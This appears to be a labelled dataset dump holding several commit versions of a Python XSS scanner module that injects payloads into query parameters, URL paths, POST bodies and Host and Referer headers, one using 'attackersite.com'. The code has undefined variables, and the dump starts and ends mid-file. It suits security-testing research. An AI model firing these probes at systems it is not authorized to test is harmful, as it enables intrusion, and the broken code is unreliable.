api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    print ""response header"",res_headers['Content-Type']
    if res_headers['Content-Type']:
        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:
            # Possible XSS 
            impact = ""Low""
        else:
            impact = ""High""
    else:
        impact = ""Low""

    return impact


def xss_payload_decode(payload):
    # Return decoded payload of XSS. 
    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')
    return decoded_payload

def xss_post_method(url,method,headers,body,scanid=None):
    # This function checks XSS through POST method.
    print url, headers,method,body
    temp_body = {}
    post_vul_param = ''
    for key,value in body.items():
        xss_payloads = fetch_xss_payload()
        for payload in xss_payloads:
            temp_body.update(body)
            temp_body[key] = payload
            print ""updated body"",temp_body
            xss_post_request = req.api_request(url, ""POST"", headers, temp_body)
            decoded_payload = xss_payload_decode(payload)
            if xss_post_request.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_post_request.headers)
                if db_update is not True:
                    attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                    dbupdate.insert_record(attack_result)
                    db_update = True
                    vul_param += key
                else:
                    result = True
                    if vul_param == '':
                        post_vul_param += key
                    else:
                        post_vul_param += ','+key 

    if post_vul_param:
        dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : post_vul_param+"" are vulnerable to XSS""}})


def xss_http_headers(url,method,headers,body,scanid=None):
    # This function checks different header based XSS.
    # XSS via Host header (Limited to IE)
    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/
    temp_headers = {}
    temp_headers.update(headers)
    xss_payloads = fetch_xss_payload()
    for payload in xss_payloads:
        parse_domain = urlparse.urlparse(url).netloc
        host_header = {""Host"" : parse_domain + '/' + payload}
        headers.update(host_header)
        host_header_xss = req.api_request(url, ""GET"", headers)
        decoded_payload = xss_payload_decode(payload)
        if host_header_xss.text.find(decoded_payload) != -1:
            impact = ""Low""
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": host_header_xss.headers ,""res_body"": host_header_xss.text}
            dbupdate.insert_record(attack_result)
            break

    # Test for Referer based XSS 
    for payload in xss_payloads:
        referer_header_value = 'http://attackersite.com?test='+payload
        referer_header = {""Referer"" : referer_header_value}
        temp_headers.update(referer_header)
        ref_header_xss = req.api_request(url, ""GET"", temp_headers)
        decoded_payload = xss_payload_decode(payload)
        if ref_header_xss.text.find(decoded_payload) != -1:
            print ref_header_xss.text
            impact = check_xss_impact(temp_headers)
            print ""%s[{0}] {1} is vulnerable to XSS via referer header%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting via referer header"", ""impact"": impact, ""req_headers"": temp_headers, ""req_body"":body, ""res_headers"": ref_header_xss.headers ,""res_body"": ref_header_xss.text}
            dbupdate.insert_record(attack_result)
            return


def xss_get_url(url,method,headers,body,scanid=None):
    # Check for URL based XSS. 
    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
    result = ''
    xss_payloads = fetch_xss_payload()
    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
    for uri_list in uri_check_list:
        if uri_list in url:
            # Parse domain name from URI.
            parsed_url = urlparse.urlparse(url).scheme+""://""+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
            break

    if parsed_url == '':
        parsed_url = url

    for payload in xss_payloads:
        xss_request_url = req.api_request(parsed_url+'/'+payload,""GET"",headers)
        if result is not True:
            decoded_payload = xss_payload_decode(payload)
            if xss_request_url.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_request_url.headers)
                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
                dbupdate.insert_record(attack_result)
                result = True

        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,""GET"",headers)             
        if xss_request_url.text.find(decoded_payload) != -1:
            impact = check_xss_impact(xss_request_uri.headers)
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
            dbupdate.insert_record(attack_result)
                

def xss_get_uri(url,method,headers,body,scanid=None):
    # This function checks for URI based XSS. 
    # http://localhost/?firstname=<payload>&lastname=<payload>
    db_update = ''
    vul_param = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                result = ''
                logs.logging.info(""GET param for xss : %s"",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        parsed_url = urlparse.urlparse(url)
                        xss_url = parsed_url.scheme+""://""+parsed_url.netloc+parsed_url.path+""/?""+parsed_url.query.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,""GET"",headers)
                        decoded_payload = xss_payload_decode(payload)
                        print decoded_payload
                        print xss_url
                        if xss_request.text.find(decoded_payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info(""%s is vulnerable to XSS"",url)
                            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                            if db_update is not True:
                                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                                dbupdate.insert_record(attack_result)
                                result,db_update = True,True
                                vul_param += key
                            else:
                                result = True
                                if vul_param == '':
                                    vul_param += key
                                else:
                                    vul_param += ','+key                  
        
            except:
                logs.logging.info(""XSS: No GET param found!"")

        if vul_param:
            # Update all vulnerable params to db.
            print vul_param,scanid
            dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : vul_param+"" parameters are vulnerable to XSS""}})


def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_uri(url,method,headers,body,scanid)
        xss_get_url(url,method,headers,body,scanid)

    if method == 'POST' or method == 'PUT':
        xss_post_method(url,method,headers,body,scanid)

    xss_http_headers(url,method,headers,body,scanid)/n/n/n",0
15,adf60251870f581f368cfd5a6d5e0337e9ba4c76,"/modules/xss.py/n/nimport os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse
import time
import urllib

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    print ""response header"",res_headers['Content-Type']
    if res_headers['Content-Type']:
        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:
            # Possible XSS 
            impact = ""Low""
        else:
            impact = ""High""
    else:
        impact = ""Low""

    return impact


def xss_payload_decode(payload):
    # Return decoded payload of XSS. 
    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')
    return decoded_payload

def xss_post_method(url,method,headers,body,scanid=None):
    # This function checks XSS through POST method.
    print url, headers,method,body
    temp_body = {}
    post_vul_param = ''
    for key,value in body.items():
        xss_payloads = fetch_xss_payload()
        for payload in xss_payloads:
            temp_body.update(body)
            temp_body[key] = payload
            print ""updated body"",temp_body
            xss_post_request = req.api_request(url, ""POST"", headers, temp_body)
            decoded_payload = xss_payload_decode(payload)
            if xss_post_request.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_post.body)
                if db_update is not True:
                    attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                    dbupdate.insert_record(attack_result)
                    db_update = True
                    vul_param += key
                else:
                    result = True
                    if vul_param == '':
                        post_vul_param += key
                    else:
                        post_vul_param += ','+key 

    if post_vul_param:
        dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : post_vul_param+"" are vulnerable to XSS""}})


def xss_http_headers(url,method,headers,body,scanid=None):
    # This function checks different header based XSS.
    # XSS via Host header (Limited to IE)
    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/
    temp_headers = {}
    temp_headers.update(headers)
    xss_payloads = fetch_xss_payload()
    for payload in xss_payloads:
        parse_domain = urlparse.urlparse(url).netloc
        host_header = {""Host"" : parse_domain + '/' + payload}
        headers.update(host_header)
        host_header_xss = req.api_request(url, ""GET"", headers)
        decoded_payload = xss_payload_decode(payload)
        if host_header_xss.text.find(decoded_payload) != -1:
            impact = ""Low""
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": host_header_xss.headers ,""res_body"": host_header_xss.text}
            dbupdate.insert_record(attack_result)
            break

    # Test for Referer based XSS 
    for payload in xss_payloads:
        referer_header_value = 'http://attackersite.com?test='+payload
        referer_header = {""Referer"" : referer_header_value}
        temp_headers.update(referer_header)
        ref_header_xss = req.api_request(url, ""GET"", temp_headers)
        decoded_payload = xss_payload_decode(payload)
        if ref_header_xss.text.find(decoded_payload) != -1:
            print ref_header_xss.text
            impact = check_xss_impact(temp_headers)
            print ""%s[{0}] {1} is vulnerable to XSS via referer header%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting via referer header"", ""impact"": impact, ""req_headers"": temp_headers, ""req_body"":body, ""res_headers"": ref_header_xss.headers ,""res_body"": ref_header_xss.text}
            dbupdate.insert_record(attack_result)
            return


def xss_get_url(url,method,headers,body,scanid=None):
    # Check for URL based XSS. 
    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
    result = ''
    xss_payloads = fetch_xss_payload()
    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
    for uri_list in uri_check_list:
        if uri_list in url:
            # Parse domain name from URI.
            parsed_url = urlparse.urlparse(url).scheme+""://""+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
            break

    if parsed_url == '':
        parsed_url = url

    for payload in xss_payloads:
        xss_request_url = req.api_request(parsed_url+'/'+payload,""GET"",headers)
        if result is not True:
            decoded_payload = xss_payload_decode(payload)
            if xss_request_url.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_request_url.headers)
                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
                dbupdate.insert_record(attack_result)
                result = True

        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,""GET"",headers)             
        if xss_request_url.text.find(decoded_payload) != -1:
            impact = check_xss_impact(xss_request_uri.headers)
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
            dbupdate.insert_record(attack_result)
                

def xss_get_uri(url,method,headers,body,scanid=None):
    # This function checks for URI based XSS. 
    # http://localhost/?firstname=<payload>&lastname=<payload>
    db_update = ''
    vul_param = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                result = ''
                logs.logging.info(""GET param for xss : %s"",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        parsed_url = urlparse.urlparse(url)
                        xss_url = parsed_url.scheme+""://""+parsed_url.netloc+parsed_url.path+""/?""+parsed_url.query.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,""GET"",headers)
                        decoded_payload = xss_payload_decode(payload)
                        print decoded_payload
                        print xss_url
                        if xss_request.text.find(decoded_payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info(""%s is vulnerable to XSS"",url)
                            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                            if db_update is not True:
                                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                                dbupdate.insert_record(attack_result)
                                result,db_update = True,True
                                vul_param += key
                            else:
                                result = True
                                if vul_param == '':
                                    vul_param += key
                                else:
                                    vul_param += ','+key                  
        
            except:
                logs.logging.info(""XSS: No GET param found!"")

        if vul_param:
            # Update all vulnerable params to db.
            print vul_param,scanid
            dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : vul_param+"" parameters are vulnerable to XSS""}})


def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_uri(url,method,headers,body,scanid)
        xss_get_url(url,method,headers,body,scanid)

    if method == 'POST' or method == 'PUT':
        xss_post_method(url,method,headers,body,scanid)

    xss_http_headers(url,method,headers,body,scanid)/n/n/n",1
16,9d52656d839d6a97eeca12578ca127318a367e00,"modules/xss.py/n/nimport os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse
import time
import urllib

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    print ""response header"",res_headers['Content-Type']
    if res_headers['Content-Type']:
        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:
            # Possible XSS 
            impact = ""Low""
        else:
            impact = ""High""
    else:
        impact = ""Low""

    return impact


def xss_payload_decode(payload):
    # Return decoded payload of XSS. 
    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')
    return decoded_payload

def xss_post_method(url,method,headers,body,scanid=None):
    # This function checks XSS through POST method.
    print url, headers,method,body
    temp_body = {}
    post_vul_param = ''
    for key,value in body.items():
        xss_payloads = fetch_xss_payload()
        for payload in xss_payloads:
            temp_body.update(body)
            temp_body[key] = payload
            print ""updated body"",temp_body
            xss_post_request = req.api_request(url, ""POST"", headers, temp_body)
            decoded_payload = xss_payload_decode(payload)
            if xss_post_request.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_post_request.headers)
                if db_update is not True:
                    attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                    dbupdate.insert_record(attack_result)
                    db_update = True
                    vul_param += key
                else:
                    result = True
                    if vul_param == '':
                        post_vul_param += key
                    else:
                        post_vul_param += ','+key 

    if post_vul_param:
        dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : post_vul_param+"" are vulnerable to XSS""}})


def xss_http_headers(url,method,headers,body,scanid=None):
    # This function checks different header based XSS.
    # XSS via Host header (Limited to IE)
    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/
    temp_headers = {}
    temp_headers.update(headers)
    xss_payloads = fetch_xss_payload()
    for payload in xss_payloads:
        parse_domain = urlparse.urlparse(url).netloc
        host_header = {""Host"" : parse_domain + '/' + payload}
        headers.update(host_header)
        host_header_xss = req.api_request(url, ""GET"", headers)
        decoded_payload = xss_payload_decode(payload)
        if host_header_xss.text.find(decoded_payload) != -1:
            impact = ""Low""
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": host_header_xss.headers ,""res_body"": host_header_xss.text}
            dbupdate.insert_record(attack_result)
            break

    # Test for Referer based XSS 
    for payload in xss_payloads:
        referer_header_value = 'https://github.com?test='+payload
        referer_header = {""Referer"" : referer_header_value}
        temp_headers.update(referer_header)
        ref_header_xss = req.api_request(url, ""GET"", temp_headers)
        decoded_payload = xss_payload_decode(payload)
        if ref_header_xss.text.find(decoded_payload) != -1:
            print ref_header_xss.text
            impact = check_xss_impact(temp_headers)
            print ""%s[{0}] {1} is vulnerable to XSS via referer header%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting via referer header"", ""impact"": impact, ""req_headers"": temp_headers, ""req_body"":body, ""res_headers"": ref_header_xss.headers ,""res_body"": ref_header_xss.text}
            dbupdate.insert_record(attack_result)
            return


def xss_get_url(url,method,headers,body,scanid=None):
    # Check for URL based XSS. 
    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
    result = ''
    xss_payloads = fetch_xss_payload()
    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
    for uri_list in uri_check_list:
        if uri_list in url:
            # Parse domain name from URI.
            parsed_url = urlparse.urlparse(url).scheme+""://""+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
            break

    if parsed_url == '':
        parsed_url = url

    for payload in xss_payloads:
        xss_request_url = req.api_request(parsed_url+'/'+payload,""GET"",headers)
        if result is not True:
            decoded_payload = xss_payload_decode(payload)
            if xss_request_url.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_request_url.headers)
                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
                dbupdate.insert_record(attack_result)
                result = True

        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,""GET"",headers)             
        if xss_request_url.text.find(decoded_payload) != -1:
            impact = check_xss_impact(xss_request_uri.headers)
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
            dbupdate.insert_record(attack_result)
                

def xss_get_uri(url,method,headers,body,scanid=None):
    # This function checks for URI based XSS. 
    # http://localhost/?firstname=<payload>&lastname=<payload>
    db_update = ''
    vul_param = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                result = ''
                logs.logging.info(""GET param for xss : %s"",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        parsed_url = urlparse.urlparse(url)
                        xss_url = parsed_url.scheme+""://""+parsed_url.netloc+parsed_url.path+""/?""+parsed_url.query.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,""GET"",headers)
                        decoded_payload = xss_payload_decode(payload)
                        print decoded_payload
                        print xss_url
                        if xss_request.text.find(decoded_payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info(""%s is vulnerable to XSS"",url)
                            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                            if db_update is not True:
                                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                                dbupdate.insert_record(attack_result)
                                result,db_update = True,True
                                vul_param += key
                            else:
                                result = True
                                if vul_param == '':
                                    vul_param += key
                                else:
                                    vul_param += ','+key                  
        
            except:
                logs.logging.info(""XSS: No GET param found!"")

        if vul_param:
            # Update all vulnerable params to db.
            print vul_param,scanid
            dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : vul_param+"" parameters are vulnerable to XSS""}})


def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_uri(url,method,headers,body,scanid)
        xss_get_url(url,method,headers,body,scanid)

    if method == 'POST' or method == 'PUT':
        xss_post_method(url,method,headers,body,scanid)

    xss_http_headers(url,method,headers,body,scanid)/n/n/n",0
17,9d52656d839d6a97eeca12578ca127318a367e00,"/modules/xss.py/n/nimport os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse
import time
import urllib

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    print ""response header"",res_headers['Content-Type']
    if res_headers['Content-Type']:
        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:
            # Possible XSS 
            impact = ""Low""
        else:
            impact = ""High""
    else:
        impact = ""Low""

    return impact


def xss_payload_decode(payload):
    # Return decoded payload of XSS. 
    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')
    return decoded_payload

def xss_post_method(url,method,headers,body,scanid=None):
    # This function checks XSS through POST method.
    print url, headers,method,body
    temp_body = {}
    post_vul_param = ''
    for key,value in body.items():
        xss_payloads = fetch_xss_payload()
        for payload in xss_payloads:
            temp_body.update(body)
            temp_body[key] = payload
            print ""updated body"",temp_body
            xss_post_request = req.api_request(url, ""POST"", headers, temp_body)
            decoded_payload = xss_payload_decode(payload)
            if xss_post_request.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_post_request.headers)
                if db_update is not True:
                    attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                    dbupdate.insert_record(attack_result)
                    db_update = True
                    vul_param += key
                else:
                    result = True
                    if vul_param == '':
                        post_vul_param += key
                    else:
                        post_vul_param += ','+key 

    if post_vul_param:
        dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : post_vul_param+"" are vulnerable to XSS""}})


def xss_http_headers(url,method,headers,body,scanid=None):
    # This function checks different header based XSS.
    # XSS via Host header (Limited to IE)
    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/
    temp_headers = {}
    temp_headers.update(headers)
    xss_payloads = fetch_xss_payload()
    for payload in xss_payloads:
        parse_domain = urlparse.urlparse(url).netloc
        host_header = {""Host"" : parse_domain + '/' + payload}
        headers.update(host_header)
        host_header_xss = req.api_request(url, ""GET"", headers)
        decoded_payload = xss_payload_decode(payload)
        if host_header_xss.text.find(decoded_payload) != -1:
            impact = ""Low""
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": host_header_xss.headers ,""res_body"": host_header_xss.text}
            dbupdate.insert_record(attack_result)
            break

    # Test for Referer based XSS 
    for payload in xss_payloads:
        referer_header_value = 'http://attackersite.com?test='+payload
        referer_header = {""Referer"" : referer_header_value}
        temp_headers.update(referer_header)
        ref_header_xss = req.api_request(url, ""GET"", temp_headers)
        decoded_payload = xss_payload_decode(payload)
        if ref_header_xss.text.find(decoded_payload) != -1:
            print ref_header_xss.text
            impact = check_xss_impact(temp_headers)
            print ""%s[{0}] {1} is vulnerable to XSS via referer header%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting via referer header"", ""impact"": impact, ""req_headers"": temp_headers, ""req_body"":body, ""res_headers"": ref_header_xss.headers ,""res_body"": ref_header_xss.text}
            dbupdate.insert_record(attack_result)
            return


def xss_get_url(url,method,headers,body,scanid=None):
    # Check for URL based XSS. 
    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
    result = ''
    xss_payloads = fetch_xss_payload()
    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
    for uri_list in uri_check_list:
        if uri_list in url:
            # Parse domain name from URI.
            parsed_url = urlparse.urlparse(url).scheme+""://""+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
            break

    if parsed_url == '':
        parsed_url = url

    for payload in xss_payloads:
        xss_request_url = req.api_request(parsed_url+'/'+payload,""GET"",headers)
        if result is not True:
            decoded_payload = xss_payload_decode(payload)
            if xss_request_url.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_request_url.headers)
                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
                dbupdate.insert_record(attack_result)
                result = True

        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,""GET"",headers)             
        if xss_request_url.text.find(decoded_payload) != -1:
            impact = check_xss_impact(xss_request_uri.headers)
            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request_url.headers ,""res_body"": xss_request_url.text}
            dbupdate.insert_record(attack_result)
                

def xss_get_uri(url,method,headers,body,scanid=None):
    # This function checks for URI based XSS. 
    # http://localhost/?firstname=<payload>&lastname=<payload>
    db_update = ''
    vul_param = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                result = ''
                logs.logging.info(""GET param for xss : %s"",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        parsed_url = urlparse.urlparse(url)
                        xss_url = parsed_url.scheme+""://""+parsed_url.netloc+parsed_url.path+""/?""+parsed_url.query.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,""GET"",headers)
                        decoded_payload = xss_payload_decode(payload)
                        print decoded_payload
                        print xss_url
                        if xss_request.text.find(decoded_payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info(""%s is vulnerable to XSS"",url)
                            print ""%s[{0}] {1} is vulnerable to XSS%s"".format(impact,url)% (api_logger.G, api_logger.W)
                            if db_update is not True:
                                attack_result = { ""id"" : 11, ""scanid"" : scanid, ""url"" : xss_url, ""alert"": ""Cross Site Scripting"", ""impact"": impact, ""req_headers"": headers, ""req_body"":body, ""res_headers"": xss_request.headers ,""res_body"": xss_request.text}
                                dbupdate.insert_record(attack_result)
                                result,db_update = True,True
                                vul_param += key
                            else:
                                result = True
                                if vul_param == '':
                                    vul_param += key
                                else:
                                    vul_param += ','+key                  
        
            except:
                logs.logging.info(""XSS: No GET param found!"")

        if vul_param:
            # Update all vulnerable params to db.
            print vul_param,scanid
            dbupdate.update_record({""scanid"": scanid}, {""$set"" : {""scan_data"" : vul_param+"" parameters are vulnerable to XSS""}})


def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_uri(url,method,headers,body,scanid)
        xss_get_url(url,method,headers,body,scanid)

